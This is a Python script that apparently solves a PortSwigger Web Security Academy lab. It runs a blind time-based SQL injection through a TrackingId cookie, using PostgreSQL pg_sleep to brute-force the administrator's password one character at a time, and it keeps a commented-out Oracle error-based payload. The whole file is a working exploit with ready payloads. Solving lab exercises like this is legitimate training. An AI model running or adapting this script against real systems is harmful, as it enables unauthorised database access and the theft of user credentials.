import requests
import sys

def check_result(guess, placeholder):
	payload = f"mDBKtKgro2haLP6F'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,{placeholder})='{guess}')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--"
	#payload = f"3lJCIz8MXy72x3l8'||(SELECT CASE WHEN SUBSTR(password,1,{placeholder})='{guess}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
	sessionid = '8OgW2ZSOzrRtFie6nhw8PJBbeMIUdSI2'
	cookies = {'TrackingId' : payload,
				'session' : sessionid }

	url = 'https://ac391fb71ffe81c6805e1cc2001500c5.web-security-academy.net/'
	r = requests.get(url, cookies=cookies)

	if r.elapsed.total_seconds() >= 5:
		return True
	else:
		return False


def brute():
	pw = ''
	charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
	for i in range(20):
		for char in charset:
			sys.stdout.write(f"\rPassword: {pw+char}")
			if check_result(pw+char, i+1):
				pw += char
				sys.stdout.write(f"\rPassword: {pw}")
				break

brute()